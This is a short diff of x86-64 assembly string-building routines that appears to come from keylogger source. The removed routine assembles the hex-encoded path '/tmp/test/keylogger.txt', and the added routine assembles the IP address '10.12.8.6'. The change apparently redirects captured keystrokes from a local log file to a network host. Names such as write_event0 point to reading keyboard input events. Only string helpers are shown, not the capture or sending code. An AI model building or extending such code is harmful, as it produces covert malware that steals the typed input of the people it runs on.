@@ -8,7 +8,7 @@ global write_test
 global write_test2
 global write_sign
 global write_event0
-global write_keylog
+global write_ip
 
 write_exe:
 	mov [rdi], DWORD 0x6578652f
@@ -76,11 +76,11 @@ write_event0:
 	mov [rdi + 0x10], DWORD 0x00000030
 	ret
 	
-write_keylog: 
-	mov [rdi], DWORD 0x706d742f
-	mov [rdi + 0x4], DWORD 0x7365742f
-	mov [rdi + 0x8], DWORD 0x656b2f74
-	mov [rdi + 0xc], DWORD 0x676f6c79
-	mov [rdi + 0x10], DWORD 0x2e726567
-	mov [rdi + 0x14], DWORD 0x00747874
+write_ip: 
+	mov [rdi], DWORD 0x312e3031
+	mov [rdi + 0x4], DWORD 0x2e382e32
+	mov [rdi + 0x8], DWORD 0x00000036
+;	mov [rdi + 0xc], DWORD 0x676f6c79
+;	mov [rdi + 0x10], DWORD 0x2e726567
+;	mov [rdi + 0x14], DWORD 0x00747874
 	ret
